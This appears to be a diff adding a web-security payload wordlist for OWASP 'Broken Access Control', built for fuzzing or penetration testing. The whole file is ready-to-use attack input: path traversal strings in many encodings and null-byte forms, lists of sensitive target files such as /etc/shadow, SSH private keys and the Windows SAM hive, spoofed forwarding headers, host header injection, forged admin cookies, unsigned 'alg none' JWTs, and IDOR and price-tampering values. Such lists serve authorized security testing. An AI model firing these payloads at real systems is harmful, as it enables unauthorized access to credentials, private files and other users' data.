@@ -1,0 +1,425 @@
+# OWASP A01:2021 - Broken Access Control Payloads
+# Complete collection of access control bypass techniques
+
+# Path Traversal & Directory Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+../../../../../../../../../
+../../../../../../../../../../
+../../../../../../../../../../../
+../../../../../../../../../../../../
+../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+..%2f
+..%2f..%2f
+..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f
+..%5c
+..%5c..%5c
+..%5c..%5c..%5c
+..%5c..%5c..%5c..%5c
+..%5c..%5c..%5c..%5c..%5c
+..%5c..%5c..%5c..%5c..%5c..%5c
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
+..%c0%af
+..%c1%9c
+..%e0%80%af
+%2e%2e%2f
+%2e%2e%2f%2e%2e%2f
+%2e%2e%2f%2e%2e%2f%2e%2e%2f
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
+%2e%2e%5c
+%2e%2e%5c%2e%2e%5c
+%2e%2e%5c%2e%2e%5c%2e%2e%5c
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c
+....//
+....\\
+..././
+.....//
+.....\\
+....\\/
+....\/
+....//
+...\\/
+..\\/
+..\\
+.../
+...//
+..\/
+./
+.\
+.%2f
+.%5c
+%2e%2e/
+%2e%2e\
+%2e%2e%2f
+%2e%2e%5c
+%2e%2e%252f
+%2e%2e%255c
+..%252f
+..%255c
+..%u2215
+..%u2216
+..%u002f
+..%u005c
+..\u2215
+..\u2216
+..\u002f
+..\u005c
+
+# URL Encoding Variations
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%2f%70%61%73%73%77%64
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%65%74%63%2f%70%61%73%73%77%64
+
+# Unicode Bypasses
+%c0%ae%c0%ae/
+%c1%1c../
+%c0%2e%c0%2e/
+%c0%ae%c0%ae\
+%c1%1c..\
+%c0%2e%c0%2e\
+
+# Double URL Encoding
+%252e%252e%252f
+%252e%252e%255c
+%2e%2e%252f
+%2e%2e%255c
+
+# Overlong UTF-8 Encoding
+%c0%ae%c0%ae%c0%af
+%e0%80%ae%c0%ae%c0%af
+%c0%ae%c0%ae%c0%2f
+%e0%80%ae%c0%ae%c0%2f
+
+# Mixed Case
+../
+..\
+..\\
+..\\/
+..//\
+..\\//
+..\\\
+
+# 16-bit Unicode encoding
+%u002e%u002e%u002f
+%u002e%u002e%u005c
+%u002e%u002e%u2215
+%u002e%u002e%u2216
+
+# Null Byte Injection
+../%00
+../\%00
+..%00/
+..%00\
+../%00/
+..\%00\
+%00../
+%00..\
+
+# Backslash Variations
+..\
+..\\
+..\\\
+..\\\\
+..\\\\\
+..\\\\\\
+..\\\\\\\
+..\\\\\\\\
+
+# Forward Slash Variations
+../
+..//
+..///
+..////
+..///// 
+..//////
+..//////
+..////////
+
+# Mixed Separators
+..\/
+..\//
+..//\
+..\\/\
+..//\\
+..\\\//
+..\/\/
+../\/\
+
+# Common Files to Access
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/group
+/etc/fstab
+/etc/crontab
+/proc/version
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/loadavg
+/proc/meminfo
+/proc/cpuinfo
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/mounts
+/proc/swaps
+/sys/kernel/hostname
+/sys/kernel/ostype
+/sys/kernel/osrelease
+/sys/kernel/version
+/boot/grub/grub.cfg
+/boot/grub2/grub.cfg
+/var/log/auth.log
+/var/log/syslog
+/var/log/messages
+/var/log/kern.log
+/var/log/cron.log
+/var/log/maillog
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/mysql/error.log
+/var/www/html/index.html
+/var/www/index.html
+/var/www/html/config.php
+/var/www/html/configuration.php
+/var/www/html/wp-config.php
+/var/www/html/.htaccess
+/usr/local/etc/apache22/httpd.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/nginx/nginx.conf
+/etc/nginx/sites-available/default
+/etc/nginx/sites-enabled/default
+/home/user/.ssh/id_rsa
+/home/user/.ssh/id_dsa
+/home/user/.ssh/authorized_keys
+/home/user/.bash_history
+/home/user/.mysql_history
+/home/user/.viminfo
+/root/.ssh/id_rsa
+/root/.ssh/id_dsa
+/root/.ssh/authorized_keys
+/root/.bash_history
+/root/.mysql_history
+/root/.viminfo
+
+# Windows Files
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SOFTWARE
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\Windows\boot.ini
+C:\boot.ini
+C:\autoexec.bat
+C:\config.sys
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\Windows\repair\SOFTWARE
+C:\Windows\repair\SECURITY
+C:\Windows\iis6.log
+C:\Windows\iis5.log
+C:\Windows\system32\logfiles\w3svc1\ex
+C:\Windows\system32\config\AppEvent.Evt
+C:\Windows\system32\config\SecEvent.Evt
+C:\Windows\system32\config\SysEvent.Evt
+C:\Windows\system32\config\default.LOG
+C:\Windows\system32\config\security.LOG
+C:\Windows\system32\config\software.LOG
+C:\Windows\system32\config\system.LOG
+C:\Windows\system32\config\userdiff.LOG
+C:\Windows\system32\drivers\etc\networks
+C:\Windows\system32\drivers\etc\lmhosts.sam
+C:\Windows\system32\drivers\etc\services
+C:\inetpub\logs\LogFiles\W3SVC1\exYYMMDD.log
+C:\inetpub\wwwroot\global.asa
+C:\inetpub\wwwroot\index.asp
+C:\inetpub\wwwroot\web.config
+
+# Parameter Pollution
+id=1&id=2
+user=admin&user=guest
+role=user&role=admin
+access=read&access=write
+permission=view&permission=delete
+
+# HTTP Parameter Pollution (HPP)
+?param[]=value1&param[]=value2
+?param=value1&param=value2
+?param.1=value1&param.2=value2
+?param%5B%5D=value1&param%5B%5D=value2
+
+# Authorization Header Bypasses
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwared-Host: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+
+# HTTP Method Bypass
+GET /admin HTTP/1.1
+POST /admin HTTP/1.1
+PUT /admin HTTP/1.1
+DELETE /admin HTTP/1.1
+PATCH /admin HTTP/1.1
+HEAD /admin HTTP/1.1
+OPTIONS /admin HTTP/1.1
+TRACE /admin HTTP/1.1
+CONNECT /admin HTTP/1.1
+
+# User-Agent Bypasses
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
+User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
+User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+User-Agent: Twitterbot/1.0
+
+# Referer Bypasses
+Referer: http://localhost/admin
+Referer: http://127.0.0.1/admin
+Referer: https://google.com
+Referer: https://facebook.com
+Referer: https://twitter.com
+
+# Host Header Injection
+Host: localhost
+Host: 127.0.0.1
+Host: evil.com
+Host: localhost.evil.com
+Host: 127.0.0.1.evil.com
+
+# Object Level Authorization Bypass
+../user/1
+../user/2
+../admin/1
+../admin/config
+/user/1
+/user/2
+/admin/1
+/admin/config
+?id=1
+?id=2
+?user_id=1
+?user_id=2
+?admin_id=1
+?admin_id=2
+
+# Function Level Authorization Bypass
+/api/v1/users
+/api/v2/users
+/api/admin/users
+/api/internal/users
+/admin/api/users
+/internal/api/users
+/v1/admin/users
+/v2/admin/users
+
+# IDOR (Insecure Direct Object Reference)
+?document_id=1
+?document_id=2
+?file_id=1
+?file_id=2
+?invoice_id=1
+?invoice_id=2
+?order_id=1
+?order_id=2
+?transaction_id=1
+?transaction_id=2
+?account_id=1
+?account_id=2
+?profile_id=1
+?profile_id=2
+
+# Session Management Bypasses
+Cookie: sessionid=admin_session
+Cookie: auth_token=admin_token
+Cookie: user_role=admin
+Cookie: access_level=administrator
+Cookie: privilege=admin
+Cookie: permission=all
+Cookie: role=administrator
+Cookie: type=admin
+Cookie: level=admin
+Cookie: status=admin
+
+# JWT Token Manipulation
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.
+eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.
+
+# Role-Based Access Control Bypass
+user=admin
+role=administrator
+privilege=admin
+access=admin
+level=admin
+type=administrator
+permission=admin
+group=administrators
+class=admin
+category=admin
+
+# Business Logic Bypass
+quantity=-1
+amount=-100
+price=0
+discount=100
+total=-1
+balance=-1000
+credit=999999
+points=999999
+score=999999
+rating=999999
